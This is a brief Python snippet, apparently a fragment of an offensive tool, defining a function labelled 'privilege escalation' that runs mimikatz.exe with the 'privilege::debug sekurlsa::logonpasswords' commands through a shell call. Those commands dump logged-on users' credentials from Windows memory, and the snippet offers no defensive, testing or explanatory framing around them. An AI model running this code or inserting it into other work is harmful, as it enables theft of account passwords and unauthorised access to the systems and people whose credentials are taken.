
import subprocess

def privilege_escalation():
    print("Attempting privilege escalation...")
    try:
        command = "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
        subprocess.run(command, shell=True)
    except Exception as e:
        print(f"Privilege escalation failed: {e}")
